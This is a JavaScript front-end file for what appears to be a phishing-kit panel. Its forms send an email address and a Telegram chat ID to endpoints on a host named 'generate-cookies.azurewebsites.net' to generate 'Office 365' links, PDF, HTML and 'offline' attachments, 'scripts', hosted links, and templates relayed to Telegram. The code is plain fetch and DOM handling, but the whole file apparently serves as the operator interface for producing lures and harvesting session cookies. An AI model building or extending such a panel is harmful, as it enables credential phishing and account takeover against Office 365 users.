// Function to handle POST requests to API
async function postData(url = '', data = {}) {
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });

        if (!response.ok) {
            throw new Error('Network response was not ok.');
        }

        return await response.json();
    } catch (error) {
        console.error('Error:', error);
        throw error; // Rethrow the error for handling in specific functions
    }
}

// Handle form submissions when DOM content is loaded
document.addEventListener('DOMContentLoaded', function() {
    // Handle generating Office 365 link
    const linkForm = document.getElementById('linkForm');
    if (linkForm) {
        linkForm.addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent default form submission
            
            const email = document.getElementById('email').value;
            const chatId = document.getElementById('chatId').value;
            const linkResultDiv = document.getElementById('linkResult');
            linkResultDiv.innerHTML = 'Generating link...';

            try {
                const result = await postData('https://generate-cookies.azurewebsites.net/api/generateOffice365Link', { email, chatId });
                linkResultDiv.innerHTML = `Generated Link: <a href="${result.link}" target="_blank">${result.link}</a>`;
            } catch (error) {
                linkResultDiv.innerHTML = `Error generating link: ${error.message}`;
            }
        });
    }

    // Handle generating PDF attachment
    const attachmentForm = document.getElementById('attachmentForm');
    if (attachmentForm) {
        attachmentForm.addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent default form submission
            
            const content = document.getElementById('content').value;
            const chatId = document.getElementById('chatIdAttachment').value;
            const attachmentResultDiv = document.getElementById('attachmentResult');
            attachmentResultDiv.innerHTML = 'Generating PDF attachment...';

            try {
                const result = await postData('https://generate-cookies.azurewebsites.net/api/generateAttachments', { type: 'pdf', content, chatId });
                attachmentResultDiv.innerHTML = `Generated PDF: <a href="${result.attachmentUrl}" target="_blank">Download PDF</a>`;
            } catch (error) {
                attachmentResultDiv.innerHTML = `Error generating PDF: ${error.message}`;
            }
        });
    }

    // Handle generating ready offline attachment
    const offlineAttachmentForm = document.getElementById('offlineAttachmentForm');
    if (offlineAttachmentForm) {
        offlineAttachmentForm.addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent default form submission
            
            const offlineContent = document.getElementById('offlineContent').value;
            const chatId = document.getElementById('chatIdOffline').value;
            const offlineAttachmentResultDiv = document.getElementById('offlineAttachmentResult');
            offlineAttachmentResultDiv.innerHTML = 'Generating ready offline attachment...';

            try {
                const result = await postData('https://generate-cookies.azurewebsites.net/api/generateAttachments', { type: 'offline', content: offlineContent, chatId });
                offlineAttachmentResultDiv.innerHTML = `Generated Offline Attachment: <a href="${result.attachmentUrl}" target="_blank">Download Attachment</a>`;
            } catch (error) {
                offlineAttachmentResultDiv.innerHTML = `Error generating offline attachment: ${error.message}`;
            }
        });
    }

    // Handle generating scripts code JS and HTML
    const scriptsForm = document.getElementById('scriptsForm');
    if (scriptsForm) {
        scriptsForm.addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent default form submission
            
            const scriptContent = document.getElementById('scriptContent').value;
            const chatId = document.getElementById('chatIdScripts').value;
            const scriptsResultDiv = document.getElementById('scriptsResult');
            scriptsResultDiv.innerHTML = 'Generating scripts...';

            try {
                const result = await postData('https://generate-cookies.azurewebsites.net/api/generateAttachments', { type: 'scripts', content: scriptContent, chatId });
                scriptsResultDiv.innerHTML = `Generated Scripts: <a href="${result.attachmentUrl}" target="_blank">Download Scripts</a>`;
            } catch (error) {
                scriptsResultDiv.innerHTML = `Error generating scripts: ${error.message}`;
            }
        });
    }

    // Handle generating direct hosted link
    const directLinkForm = document.getElementById('directLinkForm');
    if (directLinkForm) {
        directLinkForm.addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent default form submission
            
            const hostedLinkContent = document.getElementById('hostedLinkContent').value;
            const chatId = document.getElementById('chatIdHosted').value;
            const directLinkResultDiv = document.getElementById('directLinkResult');
            directLinkResultDiv.innerHTML = 'Generating hosted link...';

            try {
                const result = await postData('https://generate-cookies.azurewebsites.net/api/generateHostedLink', { content: hostedLinkContent, chatId });
                directLinkResultDiv.innerHTML = `Generated Hosted Link: <a href="${result.hostedLink}" target="_blank">${result.hostedLink}</a>`;
            } catch (error) {
                directLinkResultDiv.innerHTML = `Error generating hosted link: ${error.message}`;
            }
        });
    }

    // Handle template selection
    const templateSelect = document.getElementById('templateSelect');
    if (templateSelect) {
        templateSelect.addEventListener('change', async function(event) {
            const selectedTemplate = event.target.value;
            const chatId = document.getElementById('chatIdTemplate').value;
            const templateResultDiv = document.getElementById('templateResult');
            templateResultDiv.innerHTML = 'Sending selected template to Telegram...';

            try {
                const result = await postData('https://generate-cookies.azurewebsites.net/api/sendTemplate', { template: selectedTemplate, chatId });
                templateResultDiv.innerHTML = `Selected Template Sent: ${result.message}`;
            } catch (error) {
                templateResultDiv.innerHTML = `Error sending template: ${error.message}`;
            }
        });
    }

    // Handle generating HTML attachment
    const htmlAttachmentForm = document.getElementById('htmlAttachmentForm');
    if (htmlAttachmentForm) {
        htmlAttachmentForm.addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent default form submission
            
            const htmlContent = document.getElementById('htmlContent').value;
            const chatId = document.getElementById('chatIdHtml').value;
            const htmlAttachmentResultDiv = document.getElementById('htmlAttachmentResult');
            htmlAttachmentResultDiv.innerHTML = 'Generating HTML attachment...';

            try {
                const result = await postData('https://generate-cookies.azurewebsites.net/api/generateAttachments', { type: 'html', content: htmlContent, chatId });
                htmlAttachmentResultDiv.innerHTML = `Generated HTML: <a href="${result.attachmentUrl}" target="_blank">Download HTML</a>`;
            } catch (error) {
                htmlAttachmentResultDiv.innerHTML = `Error generating HTML: ${error.message}`;
            }
        });
    }
});
